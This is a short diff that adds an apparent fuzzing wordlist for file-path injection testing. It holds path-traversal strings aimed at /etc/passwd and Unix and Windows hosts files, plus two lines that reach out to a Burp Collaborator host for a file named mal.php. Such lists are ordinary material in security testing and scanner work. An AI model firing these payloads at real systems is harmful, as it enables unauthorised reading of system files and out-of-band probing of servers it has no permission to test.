@@ -1,0 +1,10 @@
+/etc/passwd
+../../../../../../etc/hosts
+..\..\..\..\..\..\etc/hosts
+/etc/hostname
+../../../../../../etc/hosts
+C:/windows/system32/drivers/etc/hosts
+../../../../../../windows/system32/drivers/etc/hosts
+..\..\..\..\..\..\windows/system32/drivers/etc/hosts
+http://asdasdasdasd.burpcollab.com/mal.php
+\\asdasdasdasd.burpcollab.com/mal.php
